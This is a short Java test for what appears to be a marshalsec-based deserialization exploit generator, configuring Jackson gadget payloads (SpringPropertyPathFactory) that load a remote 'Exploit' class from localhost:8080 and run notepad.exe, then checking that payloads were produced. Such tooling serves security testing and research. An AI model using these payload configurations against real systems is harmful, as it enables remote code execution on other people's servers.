import java.util.Map;
import marshalsec.Configuration;
import marshalsec.EscapeType;
import marshalsec.Jackson;
import marshalsec.gadgets.GadgetType;
import org.junit.Assert;
import org.testng.annotations.Test;

/**
 * @author marko
 * @version 1.0.0.
 * @date 21.08.2017
 */
public class MarshalFactoryTest {

	@Test
	public void T01_runFactoryAllGadgets() throws Exception {

		Configuration c = Configuration
			.create()
			.all(true)
			.codebase("{exploit.codebase:http://localhost:8080/}")
			.codebaseClass("{exploit.codebaseClass:Exploit}")
			.escapeType(EscapeType.NONE)
			.executable("C:\\Windows\\notepad.exe")
			.gadgetType(GadgetType.SpringPropertyPathFactory)
			.build();

		Jackson jackson = new Jackson();

		jackson.run(c);

		Map<GadgetType, String> payloads = jackson.getPayload();

		if (payloads.isEmpty()) {
			Assert.fail("No payloads generated");
		}
	}

}
